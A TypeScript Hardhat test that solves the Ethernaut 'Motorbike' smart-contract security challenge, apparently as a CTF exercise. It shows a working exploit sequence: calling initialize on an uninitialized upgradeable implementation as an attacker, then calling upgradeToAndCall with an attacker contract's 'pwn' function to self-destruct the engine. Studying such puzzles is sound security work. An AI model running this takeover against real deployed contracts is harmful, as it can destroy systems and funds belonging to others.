import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Motorbike, Engine} from '../../types/typechain';

describe('Ethernaut 25: Motorbike', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let motorbike: Motorbike;
  let engine: Engine;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    // deploy engine
    engine = await ethers.getContractFactory('Engine', owner).then(f => f.deploy());
    await engine.deployed();

    // deploy motorbike that uses the engine
    motorbike = await ethers.getContractFactory('Motorbike', owner).then(f => f.deploy(engine.address));
    await motorbike.deployed();
  });

  it('should destroy the engine', async () => {
    // engine is not initialized! let's call that
    await engine.connect(attacker).initialize();

    // deploy our pwnage contract
    const attackerContract = await ethers.getContractFactory('MotorbikeAttacker', attacker).then(f => f.deploy());
    await attackerContract.deployed();

    // update the engine
    await attacker.sendTransaction({
      to: engine.address,
      data: engine.interface.encodeFunctionData('upgradeToAndCall', [
        attackerContract.address,
        attackerContract.interface.encodeFunctionData('pwn'),
      ]),
    });
  });

  after(async () => {
    // engine should have self-destructed
    expect(await ethers.provider.getCode(engine.address)).to.eq('0x');
  });
});
